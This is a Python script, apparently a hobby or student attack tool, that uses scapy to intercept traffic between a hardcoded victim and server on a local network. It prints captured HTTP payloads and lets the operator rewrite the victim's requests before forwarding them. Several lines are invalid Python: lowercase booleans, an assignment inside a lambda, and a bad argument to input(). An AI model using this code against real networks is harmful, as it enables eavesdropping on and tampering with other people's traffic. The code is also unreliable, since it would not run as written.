from scapy.all import *
from router_ip_mac import get_router_ip, get_mac
from scapy.layers import http
import copy
import keyboard

flag = false

keyboard.on_press_key('i', lambda _: flag = true)

def modify(packet):
    raw_data = packet[Raw].load
    modification = raw_data.strip().splitlines()[-1]
    print("You want to modify this line: " + modification)
    newVal = input("Put here the modified data: ", end="")
    modified_raw = raw_data.replace(modification, newVal)
    packet[Raw].load = modified_raw
    flag = false
    return packet




#disables the confirmation of send packages
conf.verb = 0

#Sets up all the necessary variables
def setup():
    global victim_ip, victim_mac, server_ip, server_mac, my_mac
    victim_ip = "192.168.2.100"
    victim_mac = get_mac(victim_ip)
    server_ip = "192.168.2.102"
    server_mac = get_mac(server_ip)
    my_mac = open(f"/sys/class/net/eth0/address").read().strip()

#Prints the sensetive information from a HTTP packet
def http_packet(packet):
    raw_data = packet[Raw].load
    raw2 = raw_data.decode('utf-8', errors="ignore")
    print(raw2)
    print(raw_data.strip().splitlines()[-1])

#changes the destination protocol of the packes, so the packages get transferred correctly
def forward_packet(packet):
    if packet.haslayer(Ether) and packet.haslayer(IP):
        packet2 = copy.deepcopy(packet)
        
        if packet.haslayer(Raw):
            http_packet(packet)
            
        if packet[Ether].src == server_mac and packet[IP].dst == victim_ip and packet[Ether].dst == my_mac:
            packet2[Ether].dst = victim_mac
            packet2[Ether].src = my_mac
            sendp(packet2)
        elif packet[Ether].src == victim_mac and packet[IP].dst == server_ip and packet[Ether].dst == my_mac:
            if flag and packet.haslayer(Raw):
                packet2 = modify(packet2)
            packet2[Ether].dst = server_mac
            packet2[Ether].src = my_mac
            sendp(packet2)


#function for initiating and sniffing for the MITM-attack
def MITM_attack():
    try:
        print("Starting MITM attack. . .")
        setup()
        sniff(iface="wlan0", prn=forward_packet, store=0)
    except KeyboardInterrupt:
        print("\nMITM attack terminated")
    return None

#starts the MITM attack
MITM_attack()
